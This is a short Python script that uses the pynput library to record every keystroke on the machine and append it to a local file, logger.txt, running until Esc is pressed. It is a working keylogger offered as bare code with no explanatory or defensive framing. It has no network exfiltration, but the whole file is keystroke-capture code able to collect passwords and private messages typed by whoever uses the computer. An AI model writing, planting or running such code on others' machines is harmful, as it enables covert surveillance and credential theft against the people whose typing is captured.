from os import remove

from pynput.keyboard import Key, Listener
keys = []
count=0


def press(key):
    global keys, count
    count = count + 1
    if key == Key.space:
        keys.append(" ")
    elif key == Key.enter:
        keys.append("\n")
    elif key == Key.shift_l:
        keys=[]
    elif key == Key.shift_r:
        keys=[]
    elif key == Key.tab:
        keys = []
    elif key == Key.alt_l:
        keys=[]
    elif key == Key.alt_r:
        keys=[]
    else:
        keys.append(key)
    if count >=1:
        write1(keys)
        keys = []
        count = 0
    print("(0)", format(key))


def write1(keys):
    with open("logger.txt", "a") as b:
        for key in keys:
            key=str(key).replace("'","")
            b.write(str(key))


def release(key):
    if key == Key.esc:
        return False
with Listener(on_press=press, on_release=release) as listener:
    listener.join()


